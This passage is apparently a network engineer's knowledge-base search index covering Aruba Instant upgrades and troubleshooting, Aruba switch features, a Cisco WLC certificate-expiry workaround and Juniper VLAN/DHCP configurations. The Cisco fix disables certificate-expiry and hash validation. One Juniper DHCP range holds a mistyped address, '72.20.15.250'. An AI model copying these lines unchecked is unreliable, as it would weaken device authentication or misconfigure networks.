<p>If the \"current_config_id\" on Master and Slave IAP equals, then both the IAPs are in Sync. But, if the \"current_config_id\" is different, then take the below steps to troubleshoot it further:</p> <ul> <li>First, one need to understand if this issue is specific to a particular Slave IAP in the cluster or all other Slaves also have the similar issue. Therefore, login into other slave IAP and issue the same command i.e.. \u00a0\"show delta-config\". </li> <li>If the issue exists with only one slave IAP then try to reboot so it can re-join the cluster and updates its configuration and the config_id.\u00a0</li> <li>But, if the issue is with all the Slaves in the cluster, then check if the Master is creating a configuration message to push to all the\u00a0Slaves, whenever a configuration change occurs. The command\u00a0\"show delta-config \" <p></p> <p>This indicates that the configuration packet is being created by Master to send to all the Slaves in the cluster. - Use the command\u00a0\"show log system \"\u00a0to see if the config file is being sent on the network.\u00a0 <p>For example, below is a sample of the configuration change with reference to IAP clock</p> <p></p> <p>Note: \"Commit Apply\" \u00a0saves the changes done from CLI</p>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Aruba_Central_Instant_Cluster/Aruba_MTU/","title":"Aruba MTU","text":"<p>You can run the commands on the VC</p> <p><pre><code>show ap debug system-status\nshow ap debug driver-config\nshow ap debug system-status | in MTU\n</code></pre> Also in Aruba Dashboard &gt; more &gt; support &gt; filter for \u201cAP log system\u201d</p>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Aruba_Central_Instant_Cluster/Upgrade_Procedure_Aruba_Central_and_Instant/","title":"Upgrade Procedure Aruba Central and Instant","text":""},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Aruba_Central_Instant_Cluster/Upgrade_Procedure_Aruba_Central_and_Instant/#the-prefered-upgrade-method","title":"The prefered upgrade method","text":"<p>Downloading the Firmware and establishing the Upgrade Path</p>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Aruba_Central_Instant_Cluster/Upgrade_Procedure_Aruba_Central_and_Instant/#step-1-current-running-firmware","title":"Step 1: Current running firmware","text":"<ul> <li>To know what the current running firmware is, log into the Aruba Instant Virtual Controller &gt; Navigate to \"Maintenance\" &gt; \"Firmware\"</li> <li>Location of the firmware Name (This will be different depending on what Access Point models).</li> <li> <p>Note down the name as we will need to search for them when downloading the firmware from Aruba's website.</p> <p></p> </li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Aruba_Central_Instant_Cluster/Upgrade_Procedure_Aruba_Central_and_Instant/#step-2-information-gathering","title":"Step 2: Information gathering","text":"<ul> <li>Visit asp.arubanetworks.com then log in with your account (If you don't have access they you won't be able to get this part done)</li> <li> <p>navigate to \"Software &amp; Documents\"</p> <p></p> </li> <li> <p>Type the version number as is (including any symbols) in the search field followed by space and the firmware version name we found earlier in the Aruba Virtual Controller firmware section. For example, Ursa, Draco, etc. based on what the Cluster is showing.</p> </li> </ul> <p>IMPORTANT!</p> <p>You must make sure that the Current Access Points on their current running Firmware are supported on your destination Firmware version.</p> <ul> <li>If not supported then you will have to figure out the upgrade path by reading the documentation for The latest Firmware and work backward until you establish a path that will upgrade from Current to Target.</li> <li>If you ignore this step and the upgrade path is not direct, the Cluster will be lost its entire configuration and you can't restore configuration backup from an older version to a newer one.</li> </ul> <ul> <li> <p>Download the Release notes by clicking the icon (Repeat this process for each firmware name needed).</p> </li> <li> <p></p> </li> <li> <p>In the Release notes search for Supported Instant AP Platforms (You MUST do this to all the Access Point models you have for the location you are working on):</p> </li> <li>You must make sure that all your Access Points are supported on that target firmware, if one isn't there, then DO NOT upgrade to this target firmware and bring this up to MOD's attention.</li> <li> <ul> <li>Example: If you have AP 584 with Firmware Instant 8.6.0 then per the below firmware you can't upgrade to this firmware directly and you would have to upgrade it by steps until you reach that Minimum required version of 8.10.0.0 or later.</li> </ul> <p>If all AP models are supported then you must check the Minimum required Instant firmware to upgrade to your target Firmware.</p> <p></p> </li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Aruba_Central_Instant_Cluster/Upgrade_Procedure_Aruba_Central_and_Instant/#step-3-the-urls","title":"Step 3: The URLs","text":""},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Aruba_Central_Instant_Cluster/Upgrade_Procedure_Aruba_Central_and_Instant/#create-the-url-link","title":"Create the URL link","text":"<p>The URL syntax should be as follows, find the below 2 URL formats:</p> <p>Try and see which one works for you, some versions only work on 1 of the below URLs, don't forget to change the Firmware Version Number!</p>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Aruba_Central_Instant_Cluster/Upgrade_Procedure_Aruba_Central_and_Instant/#url-format-1","title":"URL Format 1","text":"<p>http://d2vxf1j0rhr3p0.cloudfront.net/fwfiles/ArubaInstant_NAME_VersionNumber</p> <p>Below links are examples of the different version names available for firmware version 8.7.1.6_81786</p> <p>Ursa http://d2vxf1j0rhr3p0.cloudfront.net/fwfiles/ArubaInstant_Ursa_8.7.1.6_81786</p> <p>Draco http://d2vxf1j0rhr3p0.cloudfront.net/fwfiles/ArubaInstant_Draco_8.7.1.6_81786</p> <p>Hercules http://d2vxf1j0rhr3p0.cloudfront.net/fwfiles/ArubaInstant_Hercules_8.7.1.6_81786</p> <p>Gemini http://d2vxf1j0rhr3p0.cloudfront.net/fwfiles/ArubaInstant_Gemini_8.7.1.6_81786</p> <p>Lupus http://d2vxf1j0rhr3p0.cloudfront.net/fwfiles/ArubaInstant_Lupus_8.7.1.6_81786</p> <p>Scorpio http://d2vxf1j0rhr3p0.cloudfront.net/fwfiles/ArubaInstant_Scorpio_8.7.1.6_81786</p> <p>Vela http://d2vxf1j0rhr3p0.cloudfront.net/fwfiles/ArubaInstant_Vela_8.7.1.6_81786</p>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Aruba_Central_Instant_Cluster/Upgrade_Procedure_Aruba_Central_and_Instant/#url-format-2","title":"URL Format 2","text":"<p>http://common.cloud.hpe.com/ccssvc/ccs-system-firmware-registry/IAP/ArubaInstant_NAME_VersionNumber</p> <p>Below links are examples of the different version names available for firmware version 8.10.0.1_84079</p> <p>Ursa http://common.cloud.hpe.com/ccssvc/ccs-system-firmware-registry/IAP/ArubaInstant_Ursa_8.10.0.1_84079</p> <p>Draco http://common.cloud.hpe.com/ccssvc/ccs-system-firmware-registry/IAP/ArubaInstant_Draco_8.10.0.1_84079</p> <p>Hercules http://common.cloud.hpe.com/ccssvc/ccs-system-firmware-registry/IAP/ArubaInstant_Hercules_8.10.0.1_84079</p> <p>Gemini http://common.cloud.hpe.com/ccssvc/ccs-system-firmware-registry/IAP/ArubaInstant_Gemini_8.10.0.1_84079</p> <p>Lupus http://common.cloud.hpe.com/ccssvc/ccs-system-firmware-registry/IAP/ArubaInstant_Lupus_8.10.0.1_84079</p> <p>Scorpio http://common.cloud.hpe.com/ccssvc/ccs-system-firmware-registry/IAP/ArubaInstant_Scorpio_8.10.0.1_84079</p> <p>Vela http://common.cloud.hpe.com/ccssvc/ccs-system-firmware-registry/IAP/ArubaInstant_Vela_8.10.0.1_84079</p>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Aruba_Central_Instant_Cluster/Upgrade_Procedure_Aruba_Central_and_Instant/#test-the-url","title":"Test the URL","text":"<p>In your browser first, take the URL you generated and paste it into a new tab in your browser. If it starts to download and the file name and version look correct then you're good to proceed with the next steps. If the URL returns an error that was saying denied access, this method will not work and the only known way is to create a case with Aruba and ask for HTTP links and specify the Firmware version and name that is needed so they can provide you with a working link.</p>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Aruba_Central_Instant_Cluster/Upgrade_Procedure_Aruba_Central_and_Instant/#step-4-the-upgrade","title":"Step 4: The upgrade","text":"<ol> <li> <p>Login to the Virtual controller Web GUI</p> </li> <li> <p>Go to Maintenance &gt; Firmware</p> </li> <li> <p>From the manual option, enter the respective URL for the models in the tab. using the URL that was generated in point number 1.</p> </li> <li> <p>Make sure to enable the reboot AP option &gt; Click on the upgrade now</p> </li> <li> <p>The loading page should change to Downloading then Upgrading.</p> </li> <li>You will need to wait for an Upgrade Successful message.</li> <li>The Cluster will then reboot.</li> <li>When Cluster is back, log back in.</li> <li>You will need to keep monitoring the overview and refreshing the page until all the APs are back online.</li> <li>The upgrade can take anywhere from 15-20 Minutes. Keep in mind this time may vary depending on how many APs you have on the cluster.</li> <li>Check if the firmware is upgraded in the firmware section.</li> </ol>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Aruba_Central_Instant_Cluster/Upgrade_Procedure_Aruba_Central_and_Instant/#troubleshooting","title":"Troubleshooting","text":""},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Aruba_Central_Instant_Cluster/Upgrade_Procedure_Aruba_Central_and_Instant/#if-youre-having-an-issue-and-the-upgrade-is-failing-you-can-do-a-few-things-to-check","title":"If you're having an issue and the upgrade is failing you can do a few things to check.","text":"<ul> <li>Log in to FTP Server with the user you created and make sure you are able to gain access and view configuration and files.</li> <li> <p>If you're trying to upgrade multiple Images through the CLI command <code>upgrade-image</code></p> <p>Abort this as this only supports single image clusters.</p> </li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Aruba_Central_Instant_Cluster/Upgrade_Procedure_Aruba_Central_and_Instant/#if-you-try-to-upgrade-through-the-web-with-a-link-ftp-tftp-http-and-receive-an-error-similar-to-the-one-below","title":"If you try to upgrade through the web with a link [ftp, TFTP, http] and receive an error similar to the one below","text":"<p>You need to check if the Access Point can access the FTP Server you have</p> <p>You can run telnet FTP_SERVER_IP telnet-port 21 and if it's working then it will show the below 220 response</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Aruba_Central_Instant_Cluster/Upgrade_Procedure_Aruba_Central_and_Instant/#is-the-virtual-controller-having-problems-obtaining-the-image","title":"Is the Virtual Controller having problems obtaining the image?","text":"<p>that's where you can do something similar to running [replace  with the URL you're using for the firmware upgrade] <pre><code>debug-download &lt;url&gt;\n</code></pre> <p>Example command &amp; output</p> <p>Most likely you will get a more detailed log than what I showed above and from reading through it you can determine what the issue is.</p> <pre><code>debug-download ftp://ftpuser:ftpuser123@10.157.167.129/ArubaInstant_Ursa_8.7.1.6_81786\ndebug-download http://d2vxf1j0rhr3p0.cloudfront.net/fwfiles/ArubaInstant_Ursa_8.7.1.6_81786\n</code></pre> <p>if it's working fine you should be getting something like this</p> <p></p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Aruba_Central_Instant_Cluster/Upgrade_Procedure_Aruba_Central_and_Instant/#other-commands","title":"Other commands","text":"<pre><code>show log provision\nshow log upgrade\nshow activate\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Switches/Aruba_HPE_SFPs/","title":"Aruba HPE SFPs","text":""},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Switches/Aruba_HPE_SFPs/#aruba-optics","title":"Aruba Optics","text":"<p>ArubaOS-Switch and ArubaOS-CX Transceiver Guide</p> <p>In the search box located in the right corner &gt; Type the switch model. For example, I want to find SFP for HP 2920 Switch. I will type 2920 and hit enter.</p> <p></p> <p>On the left side it will filter which parts of the document have information about the switch model you searched for. You will need to click on each on to load the results and at the same time you need to search the web page it self for that model number so you can locate the information inside each document.</p> <p></p> <p>I clicked the first link and you can see I did browser search and I see the result loaded. This page is for SFP+, if you don\u2019t need SFP+ then click on the next option until you see what you want.</p> <p>The SKU is the part number that I would need to order if I want a specific type of transceiver, in this case it\u2019s SFP+.!</p> <p></p> <p>I tried another document and in this one it\u2019s for 1GB SFP Optical Transceiver, I can see the model there for browser search and then the available SKU (part number) that I can order.</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Switches/Aruba_HPE_SFPs/#hp-optics","title":"HP Optics","text":"<p>HPE Transceiver information</p> <p>If replacing existing SFP</p> <pre><code>Show interface transceiver\n</code></pre> <p></p> <p>If you want to specify the port show interface transceiver ethernet [Port-Number]</p> <p></p> <p>You can also do show interface transceiver detail</p> <p>If you do not specify a port then you will see all results and you will need to find the ports you want to get SFP replacement for, this give you all the details you need, in this case Model Number for the SFP is what you need.</p> <p></p> <p>Show interface transceiver ethernet [Port-Number] detail</p> <p></p>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Switches/Aruba_Multicast_Storm/","title":"Aruba Multicast Storm","text":""},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Switches/Aruba_Multicast_Storm/#fault-finder-multicast-storm","title":"fault-finder multicast-storm","text":"<pre><code>switch(config)# fault-finder multicast-storm\naction                Configure the action taken when a fault is detected.\n[ethernet] PORT-LIST  The ports on which to enable Multicast Storm Control.\nsensitivity           Configure the fault sensitivity level.\n</code></pre> <pre><code>switch(config)# fault-finder multicast-storm ethernet\nPORT-LIST             Enter a port number, a list of ports or 'all' for all\n                    ports.\n</code></pre> <pre><code>switch(config)# fault-finder multicast-storm ethernet 1/1\naction                Configure the action taken when a multicast storm is\n                    detected.\n</code></pre> <pre><code>switch(config)# fault-finder multicast-storm ethernet 1/1 action\nwarn                  Log an event only.\nwarn-and-disable      Log an event and disable the port.\n</code></pre> <pre><code>switch(config)# fault-finder multicast-storm ethernet 1/1 action warn-and-disable\n\nSECONDS               Configure the number of seconds for which the port\n                    remains disabled. A value of 0 means that the port will\n                    remain disabled until manually re-enabled.\n</code></pre> <pre><code>switch(config)# fault-finder multicast-storm ethernet 1/1 action warn-and-disable 10\n\npercent               Configure the number of inbound multicast packets per\n                    second that is considered a multicast storm. This\n                    threshold is computed assuming a size of 64 bytes per\n                    incoming multicast packet.\npps                   Configure the number of inbound multicast packets per\n                    second that is considered a multicast storm.\n</code></pre> <pre><code>switch(config)# fault-finder multicast-storm ethernet 1/1 action warn-and-disable 10 percent\n\n&lt;1-100&gt;               The percentage that is considered a multicast storm.\n\nswitch(config)# fault-finder multicast-storm ethernet 1/1 action warn-and-disable 10 percent 40\n</code></pre> <pre><code>show fault-finder \nshow fault-finder multicast-storm\nshow fault-finder multicast-storm 1/1\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Switches/Aruba_Multicast_Storm/#fault-finder-multicast-storm-action","title":"fault-finder multicast-storm action","text":"<pre><code>switch(config)# fault-finder multicast-storm action warn\nsensitivity     Configure the fault sensitivity level.\n</code></pre> <pre><code>switch(config)# fault-finder multicast-storm action warn sensitivity\nlow             Low sensitivity.\nmedium          Medium sensitivity.\nhigh            High sensitivity.\n</code></pre> <pre><code>switch(config)# fault-finder multicast-storm action warn-and-disable\nsensitivity     Configure the fault sensitivity level.\n</code></pre> <pre><code>switch(config)# fault-finder multicast-storm action warn-and-disable sensitivity\nlow             Low sensitivity.\nmedium          Medium sensitivity.\nhigh            High sensitivity.\n</code></pre> <pre><code>switch(config)# fault-finder multicast-storm action warn-and-disable sensitivity high \n</code></pre> <pre><code>show fault-finder\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Switches/Aruba_Multicast_Storm/#show-logging","title":"show logging","text":"<pre><code>switch# show logging\nKeys:   W=Warning   I=Information\n        M=Major     D=Debug E=Error\n\n----  Event Log listing: Events Since Boot  ----\nI 01/07/90 20:22:55 00076 ports: port 3 is now on-line\nM 01/07/90 20:22:52 02677 FFI: port 3-Port enabled by Fault-finder.\nI 01/07/90 20:22:33 00077 ports: port 3 is now off-line\nM 01/07/90 20:22:33 02676 FFI: port 3-Re-enable after 20 seconds.\nM 01/07/90 20:22:33 02673 FFI: port 3-Port disabled by Fault-finder.\nM 01/07/90 20:22:33 02675 FFI: port 3-Excessive Multicast-storm control threshold 10 % exceeded.\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Switches/Aruba_Multicast_Storm/#restrictions","title":"Restrictions","text":"<p>Multicast storm control is not supported in the following scenarios.</p> <ul> <li>Unicast packet traffic</li> <li>If the port is configured as a VSF port</li> <li>If the port is configured as a trunk port</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Switches/Aruba_Multicast_Storm/#resources","title":"Resources","text":"<ul> <li>fault-finder multicast-storm</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Switches/Aruba_Port_Mirroning/","title":"Aruba Port Mirroning","text":"<pre><code>mirror 1 port (destination interface)\ninterface (source interface) monitor all both mirror 1\n</code></pre> <p>Example</p> <p>Mirroring Port F11 to Destination Port E4. Using Mirror 2, usually you will have multiple mirrors that you can setup, I configured mirror 2 in my case.</p> <pre><code>mirror 2 port E4\ninterface F11 monitor all both mirror 2\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Switches/Aruba_WAN_Switch_Routing_2_Circuit_Redundancy/","title":"Aruba WAN Switch Routing 2 Circuit Redundancy","text":"<p>Example from Aruba Software revision  : WC.16.10.00030</p> <pre><code>ip route 0.0.0.0 0.0.0.0 10.10.10.161 distance 20\nip route 0.0.0.0 0.0.0.0 20.20.20.65\nip route 20.20.20.0 255.255.255.240 10.10.10.161\nip route 20.20.20.0 255.255.255.240 20.20.20.65\nip routing\n\nvlan 100\nname \"PrimaryISP\"\nuntagged 2-5,11-17,19-20,22-23\nip address 20.20.20.78 255.255.255.240\nexit\n\nvlan 200\nname \"SecondaryISP\"\nuntagged 6-7,9,18,21\nip address 10.10.10.164 255.255.255.224\nexit\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Switches/Switch_enable_CLI_Aruba_Central/","title":"Switch enable CLI Aruba Central","text":""},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Switches/Switch_enable_CLI_Aruba_Central/#enable-support-mode","title":"Enable support mode","text":"<pre><code>Aruba-central support-mode enable\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Aruba_HPE/Switches/Switch_enable_CLI_Aruba_Central/#disable-support-mode","title":"Disable support mode","text":"<pre><code>aruba-central support-mode disable\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Cisco/CISCO_WLC_Handshake_Failure/","title":"CISCO WLC Handshake Failure","text":""},{"location":"Knowledge_Base/Network/Vendor/Cisco/CISCO_WLC_Handshake_Failure/#the-error-message","title":"the error message","text":"<p>WLC error log message:\u00a0*spamApTask6:\u00a0 %DTLS-3-HANDSHAKE_FAILURE: openssl_dtls.c:844 Failed to complete DTLS handshake with peer</p> <p>or:</p> <p>Failed to complete DTLS handshake with peer 10.32.41.96 for AP 00:1d:45:36:97:30 *spamReceiveTask: Sep 19 21:42:59.855: %DTLS-3-HANDSHAKE_FAILURE: openssl_dtls.c:631 Failed to complete DTLS handshake with peer 1.2.3.4 for AP\u00a000:11:22:33:44:55</p>"},{"location":"Knowledge_Base/Network/Vendor/Cisco/CISCO_WLC_Handshake_Failure/#explanation","title":"explanation","text":"<p>By default, if an AP and/or WLC certificate has expired, then the DTLS connection will fail. To get around this we had to enable a command in the WLC that ignored the AP cert. The happened because the Manufacturer Installed Certificate (MIC) has now become older than ten years and has expired. To allow AP\u2019s to join a WLC after certificate expiration, upgrade to the fixed software version, then use the following commands:</p> <pre><code>! For 7.0.252.0:\n(WLC)&gt;config ap lifetime-check {mic|ssc} enable\n! For 7.4.140.0 and later:\n(WLC)&gt;config ap cert-expiry-ignore {mic|ssc} enable\n</code></pre> <p>With <code>config ap lifetime-check {mic|ssc} enable</code> or <code>config ap cert-expiry-ignore {mic|ssc} enable</code> in effect, the WLC and AP will ignore the expiration date on the devices\u2019 MICs and SSCs.</p> <p>The above-noted commands must remain in effect as long as devices with expired MIC or SSC certificates are used.</p>"},{"location":"Knowledge_Base/Network/Vendor/Cisco/CISCO_WLC_Handshake_Failure/#solution","title":"Solution","text":"<p>SSH into the WLC and run the following commands:</p> <pre><code>!on WLC 8.x:\nconfig ap cert-expiry-ignore mic enable\nconfig ap cert-expiry-ignore ssc enable\nconfig ap dtls-cipher-suite RSA-AES128-SH\nconfig ap dtls-wlc-mic sha2\n!on WLC 7.x:\nconfig ap lifetime-check mic enable\nconfig ap lifetime-check ssc enable\n</code></pre> <p>if that doesn\u2019t help try</p> <pre><code>config auth-list ap-policy ssc enable\nconfig certificate ssc hash validation disable\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_Add_VLAN_-_Ethernet_Switching_VLAN/","title":"Juniper Add VLAN - Ethernet Switching VLAN","text":"<pre><code>FOR VLAN TAGGING SETUP &lt;ge-0/0/2 vlan-tagging&gt;\nshow configuration interfaces | display set | match \"ethernet-switching\"\nshow configuration interfaces | display set | match \"vlan-tagging\"\n\n    Update the VLAN Number\n    Update VLAN Name\n    Update the Zones\n    Update the Subnet and DHCP Pool\n    Update the DHCP Group Number\n\n#Create zone for the VLAN\nset security zones security-zone GUEST interfaces ge-0/0/2.1234\nset security zones security-zone GUEST interfaces ge-0/0/2.1234 host-inbound-traffic system-services ping\nset security zones security-zone GUEST interfaces ge-0/0/2.1234 host-inbound-traffic system-services dhcp\nset security zones security-zone GUEST interfaces ge-0/0/2.1234 host-inbound-traffic system-services dns\n\n#Create policies for the VLAN to define access\nset security policies from-zone GUEST to-zone INTERNET policy GUEST_to_INTERNET match source-address any\nset security policies from-zone GUEST to-zone INTERNET policy GUEST_to_INTERNET match destination-address any\nset security policies from-zone GUEST to-zone INTERNET policy GUEST_to_INTERNET match application any\nset security policies from-zone GUEST to-zone INTERNET policy GUEST_to_INTERNET then permit\n\n########## TRY WITHOUT THIS FIRST ##########\nset security policies from-zone GUEST to-zone junos-host policy GUEST_To_Junos-host match source-address any\nset security policies from-zone GUEST to-zone junos-host policy GUEST_To_Junos-host match destination-address any\nset security policies from-zone GUEST to-zone junos-host policy GUEST_To_Junos-host match application any\nset security policies from-zone GUEST to-zone junos-host policy GUEST_To_Junos-host then permit\n############################################\n\n#Create Source Nat to Internet\nset security nat source rule-set DEFAULT_SRCNAT from zone GUEST\n\n#Create the VLAN\nset interfaces ge-0/0/2 unit 1234 description GUEST\nset interfaces ge-0/0/2 unit 1234 vlan-id 1234\nset interfaces ge-0/0/2 unit 1234 family inet address 172.20.0.1/20\n\n#Create DHCP\nset access address-assignment pool GUEST family inet network 172.20.0.1/20\nset access address-assignment pool GUEST family inet range GUEST low 172.20.0.10\nset access address-assignment pool GUEST family inet range GUEST high 72.20.15.250\nset access address-assignment pool GUEST family inet dhcp-attributes maximum-lease-time 14400\nset access address-assignment pool GUEST family inet dhcp-attributes name-server 9.9.9.9\nset access address-assignment pool GUEST family inet dhcp-attributes name-server 1.1.1.1\nset access address-assignment pool GUEST family inet dhcp-attributes name-server 8.8.8.8\nset access address-assignment pool GUEST family inet dhcp-attributes router 172.20.0.1\n\n#Create the DHCP Group for the VLAN number\nset system services dhcp-local-server group DHCP interface ge-0/0/2.1234\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_Add_VLAN_-_Ethernet_Switching_irb/","title":"Juniper Add VLAN - Ethernet Switching irb","text":"<pre><code>FOR Ethernet Switching SETUP &lt;ge-0/0/4 unit 0 family ethernet-switching&gt;\nshow configuration interfaces | display set | match \"ethernet-switching\"\nshow configuration interfaces | display set | match \"vlan-tagging\"\n\n    Update the VLAN Number\n    Update VLAN Name\n    Update the Zones\n    Update the Subnet and DHCP Pool\n    Update the DHCP Group Number\n\n#Create zone for the VLAN\nset security zones security-zone Guest interfaces irb.1234 host-inbound-traffic system-services ping\nset security zones security-zone Guest interfaces irb.1234 host-inbound-traffic system-services dhcp\nset security zones security-zone Guest interfaces irb.1234 host-inbound-traffic system-services dns\n\n#Create policies for the VLAN to define access\nset security policies from-zone Guest to-zone Internet policy Guest_to_Internet match source-address any\nset security policies from-zone Guest to-zone Internet policy Guest_to_Internet match destination-address any\nset security policies from-zone Guest to-zone Internet policy Guest_to_Internet match application any\nset security policies from-zone Guest to-zone Internet policy Guest_to_Internet then permit\n\n#Create Source Nat to Internet\nset security nat source rule-set default_srcnat from zone Guest\n\n#Create the VLAN\nset interfaces irb unit 1234 family inet address 172.20.0.1/20\n\n#Create DHCP\nset access address-assignment pool Guest family inet network 172.20.0.1/20 range Guest low 172.20.1.1 high 172.20.15.250\nset access address-assignment pool Guest family inet dhcp-attributes maximum-lease-time 86400\nset access address-assignment pool Guest family inet dhcp-attributes name-server 9.9.9.9\nset access address-assignment pool Guest family inet dhcp-attributes name-server 1.1.1.1\nset access address-assignment pool Guest family inet dhcp-attributes name-server 8.8.8.8\nset access address-assignment pool Guest family inet dhcp-attributes router 172.20.0.1\n\n#Define VLAN number\nset vlans Guest vlan-id 1234\n\n#Assign vlan to a L3 Interface\nset vlans Guest l3-interface irb.1234\n\n#Assign physical port for the VLAN - what Port it will be used on\nset interfaces ge-0/0/4 unit 0 family ethernet-switching vlan members Guest\n\n#Create the DHCP Group for the VLAN number  &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; UPDATE THE GROUP NUMBER\nset system services dhcp-local-server group g1 interface irb.1234\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_Add_VLAN_-_VLAN_Tagging_reth/","title":"Juniper Add VLAN - VLAN Tagging reth","text":"<p>FOR VLAN TAGGING SETUP show configuration interfaces | display set | match \"ethernet-switching\" show configuration interfaces | display set | match \"vlan-tagging\"</p> <pre><code>Update the VLAN Number\nUpdate VLAN Name\nUpdate the Zones\nUpdate the Subnet and DHCP Pool\nUpdate the DHCP Group Number\n</code></pre> <pre><code>#Create Source Nat to Internet\nset security nat source rule-set DEFAULT_SRCNAT from zone FreeInternet\n\n#Create policies for the VLAN to define access\nset security policies from-zone FreeInternet to-zone INTERNET policy FreeInternet-to-INTERNET match source-address any\nset security policies from-zone FreeInternet to-zone INTERNET policy FreeInternet-to-INTERNET match destination-address any\nset security policies from-zone FreeInternet to-zone INTERNET policy FreeInternet-to-INTERNET match application any\nset security policies from-zone FreeInternet to-zone INTERNET policy FreeInternet-to-INTERNET then permit\n\n#Create zone for the VLAN\nset security zones security-zone FreeInternet interfaces reth2.1234 host-inbound-traffic system-services ping\nset security zones security-zone FreeInternet interfaces reth2.1234 host-inbound-traffic system-services dhcp\nset security zones security-zone FreeInternet host-inbound-traffic system-services ping\nset security zones security-zone FreeInternet host-inbound-traffic system-services dhcp\n\n#Create DHCP\nset access address-assignment pool FreeInternet family inet network 172.24.0.1/20\nset access address-assignment pool FreeInternet family inet range FreeInternet low 172.24.0.10\nset access address-assignment pool FreeInternet family inet range FreeInternet high 172.24.15.200\nset access address-assignment pool FreeInternet family inet dhcp-attributes maximum-lease-time 86400\nset access address-assignment pool FreeInternet family inet dhcp-attributes name-server 1.1.1.1\nset access address-assignment pool FreeInternet family inet dhcp-attributes name-server 8.8.8.8\nset access address-assignment pool FreeInternet family inet dhcp-attributes name-server 9.9.9.9\nset access address-assignment pool FreeInternet family inet dhcp-attributes router 172.24.0.1\n\n#Create the VLAN\nset interfaces reth2 unit 1234 family inet address 172.24.0.1/20\nset interfaces reth2 unit 1234 vlan-id 1234\nset interfaces reth2 unit 1234 description FreeInternet\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_Configuration_Generator/","title":"Juniper Configuration Generator","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_Configuration_Generator/#juniper-configuration-generator-tools","title":"Juniper Configuration Generator Tools","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_Configuration_Generator/#official-tools","title":"Official Tools","text":"<p>Make sure to check the `About this tool section' as it might state each Tool's limitations.</p> <p></p> <ul> <li>SRX HA Configuration Generator</li> <li>SRX &amp; J Series Site-to-Site VPN Configuration Generator</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_Configuration_Generator/#non-official-tools","title":"Non Official Tools","text":"<ul> <li>Juniper Configuration Convertor Tool - to <code>display set</code> format</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_Configuration_Generator/#additional-resources","title":"Additional Resources","text":"<ul> <li>Juniper Documentation</li> <li>CLI Explorer</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/","title":"Juniper JNCIA study notes","text":"<pre><code>RE  &gt; routing, exception traffic, \nPFE &gt; does policies such as routing policies, Qos, filters\nPFE &gt; transit traffic, unicast and multicast traffic\n</code></pre> <pre><code>#### extra sources\n- [junos enterprise routing](https://www.oreilly.com/library/view/junos-enterprise-routing/9781449309633/ch04s01.html)\n- [router interfaces overview](https://www.juniper.net/documentation/us/en/software/junos/interfaces-fundamentals/topics/topic-map/router-interfaces-overview.html)\n</code></pre> <pre><code>#### Commands\n\n```bash\ntraceoptions, syslog, snmp, ntp\n\nConfig archival \n    set system archival configuration\n    transfer-interval\n    transfer-on-commit\n\nrename: move config from one interface to another\nload factory-default\n```\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#navigating-junos","title":"Navigating JunOS","text":""},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#shortcuts","title":"shortcuts","text":"<p>Space bar is for word completion Tab is for word &amp; user-defined variables completion  ctrl+k delete from cursor to end of line ctrl+w delete word to left</p>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#help-commands","title":"help commands","text":"<pre><code>#Shows commands and help topic for them\nHelp apropos\n\n#Show command full sytax, description and information\nHelp reference\n\n#shows example of config for specific topic\nHelp topic\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Juniper/Juniper_JNCIA_study_notes/#file-system","title":"file system","text":"<pre><code>file list \nsave\n\n#primary boot (Compact Flash wd0 or Internal flash). Contains running config and last 3 commits\n/config\n\n#user home directory, ssh keys, path to save and load config ,,\n/var/home\n\n#config backups for rollback, upto 